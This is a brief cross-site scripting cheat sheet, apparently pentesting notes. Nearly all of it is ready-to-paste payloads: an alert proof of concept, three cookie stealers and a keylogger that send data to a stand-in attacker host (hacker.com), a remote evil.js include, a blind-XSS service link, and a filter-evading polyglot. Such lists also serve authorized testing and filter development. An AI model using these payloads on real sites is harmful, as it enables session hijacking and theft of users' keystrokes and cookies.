# Cross Site Scripting
 
#### Generic proof of concept payload  
`<script>alert(document.domain);</script>`

#### Cookie stealer  
`<script>fetch('https://hacker.com/steal?cookie=' + btoa(document.cookie));</script>`  
`<script>var i=new Image;i.src="http://hacker.com/?"+document.cookie;</script>`  
`<img src=x onerror="this.src='http://hacker.com/?'+document.cookie; this.removeAttribute('onerror');">`

#### Key logger  
`<script>document.onkeypress = function(e) { fetch('https://hacker.com/log?key=' + btoa(e.key) );}</script>`

#### External hacker-controlled script execution  
`<script src='http://hacker.com/evil.js'></script>`  

### Blind XSS
`https://xsshunter.com/`  

### Polyglots
``jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e``
